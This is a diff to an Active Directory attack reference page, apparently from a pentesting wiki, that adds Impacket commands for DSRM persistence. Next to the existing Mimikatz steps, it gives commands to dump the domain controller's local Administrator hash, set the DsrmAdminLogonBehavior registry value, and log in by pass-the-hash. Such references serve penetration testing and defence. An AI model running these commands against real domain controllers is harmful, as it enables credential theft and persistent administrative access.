@@ -1,5 +1,5 @@
 ---
-authors: NevaSec
+authors: NevaSec, PvUL00
 category: ad
 ---
 
@@ -25,22 +25,38 @@ By exploiting these configurations, an attacker can utilize the DSRM account for
 
 ::: tabs
 
-=== Windows
+== Windows
 
 [Mimikatz](https://github.com/gentilkiwi/mimikatz) can be used to perform the attack.
 
 ```powershell
 # On the domain controller, retrieve the hash of the DSRM account (Administrator)
 mimikatz.exe "token::elevate" "lsadump::sam"
+
 # Set the registry key to allow login with the DSRM account
 New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+
 # Use the hash to authenticate and run a new PowerShell process
-mimikatz.exe "sekurlsa::pth /domain:<DC_NAME> /user:Administrator /ntlm:<NTLM_HASH> /run:powershell.exe"
+mimikatz.exe "sekurlsa::pth /domain:$DC_HOST /user:Administrator /ntlm:$NT_HASH /run:powershell.exe"
 ```
 
-=== 🛠️ UNIX-like
+== UNIX-like
 
-// TODO
+[Impacket](https://github.com/fortra/impacket)'s `secretsdump`, `reg`, and `wmiexec` scripts can be used to perform the attack remotely.
+
+```bash
+# Retrieve the DSRM account hash from the DC's local SAM database (Administrator:500 entry)
+secretsdump.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_IP"
+
+# Set the registry key to allow DSRM account login over the network
+reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_IP" add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v DsrmAdminLogonBehavior -vt REG_DWORD -vd 2
+
+# Authenticate to the DC using the DSRM hash (use DC hostname as domain)
+wmiexec.py -hashes ":$NT_HASH" "$DC_HOST/Administrator@$DC_IP"
+```
+
+> [!NOTE]
+> The DSRM account is a local account on the DC, not a domain account. When authenticating with pass-the-hash, the DC hostname (`$DC_HOST`) must be used as the domain, or `--local-auth` with tools like NetExec.
 
 :::
 
